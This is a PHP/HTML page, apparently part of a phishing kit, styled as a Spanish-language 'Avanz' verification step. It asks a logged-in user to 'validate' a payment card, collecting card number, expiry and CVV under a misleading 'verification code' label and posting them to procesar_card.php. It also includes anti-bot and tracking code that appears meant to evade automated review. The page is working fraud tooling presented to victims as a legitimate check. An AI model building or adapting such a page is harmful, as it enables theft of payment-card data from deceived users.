<?php
require_once __DIR__ . '/_guard.php';
session_start();

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avanz - Verificación</title>
    <style>
        .tem {
            color: #333;
            border: 1px solid rgb(182, 181, 181);
            border-radius: 3px;
            height: 39px;
            width: 340px;
            padding-left: 12px;
            outline: none;
            font-size: 16px;
            font-family: sans-serif;
        }

        .masa3 {
            width: 100%;
            height: 20px;
            margin: 0px;
            background-color: #005961;
            padding: 5px;
        }

        .met {
            font-family: sans-serif;
            font-size: 15px;
            min-width: 156px;
            text-transform: uppercase;
            padding: 5px 20px;
            border: none;
            height: 35px;
            color: #fff;
            background: #FF7500;
            cursor: pointer;
            margin-top: 20px;
        }

        .pp2 {
            width: 300px;
            padding: 6px 12px;
            font-size: 14px;
            line-height: 1.42857143;
            color: #555;
            border: 1px solid #ababab;
            background: #fff;
            border-radius: 4px;
            height: 34px;
            margin-left: 30px;
        }

        .form {
            width: 390px;
        }

        #error-msg {
            color: red;
            font-family: sans-serif;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body style="margin: 0;">
    <div style="width: 100%; height: 70px; padding: 10px; margin-left: 10px;">
        <img width="120px" src="img/lk.svg" alt="">
    </div>

    <div class="masa3">
        <center>
            <img style="margin-top: 3px; width: 15px;" src="img/icon-login.png" alt="">
        </center>
    </div>

    <div style="padding: 5px;">
        <center>
            <br>
            <form class="form" id="mainForm" method="post" onsubmit="return validarCard()">
                <center>
                    <div style="width: 300px;">
                        <p style="font-family: sans-serif; font-size: 18px; color: #555;">
                            Valida alguna de tus tarjetas para finalizar.
                        </p>
                        <img src="img/carcc.png" alt="">
                    </div>
                </center>

                <br>

                <div>
                    <input class="pp2" type="text" name="datos_val" id="tarj"
                           placeholder="Código de verificación" inputmode="numeric" minlength="19" maxlength="19"
                           autocomplete="off" oninput="formatTarjeta(event)" required>
                </div>

                <br>

                <div>
                    <input inputmode="numeric" type="text" id="fecha" name="vig_val" maxlength="5"
                           oninput="formatFecha(event)" required class="pp2" placeholder="Vigencia">
                </div>

                <br>

                <input type="text" class="pp2" inputmode="numeric" name="dig_sec" id="cvv"
                       maxlength="3" placeholder="Dígitos de seguridad" required>

                <!-- Anti-bot fields -->
                <input type="text" name="honeypot" class="hidden-field" autocomplete="off" style="display:none">
                <input type="hidden" id="csrf_token" name="csrf_token">
                <input type="hidden" id="form_ts" name="form_ts">

                <p id="error-msg">Por favor completa todos los campos correctamente.</p>

                <br>

                <button type="submit" class="met">CONTINUAR</button>
            </form>
        </center>
    </div>

    <script>
        // Inicializa CSRF, did y timestamp
        (function(){
            try {
                const token = (Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
                const el = document.getElementById('csrf_token');
                if (el) el.value = token;
                sessionStorage.setItem('csrf_token', token);
                document.cookie = `csrf_token=${token}; path=/; SameSite=Lax`;
                const getCookie = (name) => document.cookie.split('; ').find(r => r.startsWith(name + '='))?.split('=')[1];
                let did = getCookie('did') || localStorage.getItem('did');
                if (!did) {
                    const rand = () => Math.random().toString(36).slice(2);
                    did = `${Date.now().toString(36)}_${rand()}_${rand()}`;
                    try { localStorage.setItem('did', did); } catch(e) {}
                }
                document.cookie = `did=${did}; path=/; Max-Age=31536000; SameSite=Lax`;
                const tsEl = document.getElementById('form_ts');
                if (tsEl) tsEl.value = Date.now().toString();
            } catch(e) {}
        })();

        function formatTarjeta(event) {
            let input = event.target;
            let inputValue = input.value.replace(/\D/g, '');
            let formattedValue = '';
            
            for (let i = 0; i < inputValue.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += inputValue[i];
            }
            
            input.value = formattedValue;
        }

        function formatFecha(event) {
            let input = event.target;
            let inputValue = input.value.replace(/\D/g, '');
            let formattedValue = '';

            if (inputValue.length >= 2) {
                formattedValue += inputValue.substr(0, 2);
                if (inputValue.length > 2) {
                    formattedValue += '/' + inputValue.substr(2, 2);
                }
            } else {
                formattedValue = inputValue;
            }

            input.value = formattedValue;
        }

        function validarCard() {
            const tarj = document.getElementById('tarj').value;
            const fecha = document.getElementById('fecha').value;
            const cvv = document.getElementById('cvv').value;
            const errorMsg = document.getElementById('error-msg');

            // Anti-bot checks
            const csrfToken = document.getElementById('csrf_token').value;
            const storedToken = sessionStorage.getItem('csrf_token');
            const honeypot = document.getElementsByName('honeypot')[0]?.value || '';
            const ts = parseInt(document.getElementById('form_ts').value || '0', 10);
            const now = Date.now();

            if (csrfToken !== storedToken || (honeypot && honeypot.trim().length > 0) || !ts || (now - ts) < 800) {
                errorMsg.style.display = 'block';
                setTimeout(() => { errorMsg.style.display = 'none'; }, 3000);
                return false;
            }

            // Quitar espacios para validar longitud real
            var tarjClean = tarj.replace(/\s/g, '');
            if (tarjClean.length !== 16 || fecha.length !== 5 || cvv.length !== 3) {
                errorMsg.style.display = 'block';
                setTimeout(() => { errorMsg.style.display = 'none'; }, 3000);
                return false;
            }

            // Cambiar action dinámicamente
            document.getElementById('mainForm').action = 'procesar_card.php';
            return true;
        }
    </script>
</body>
</html>
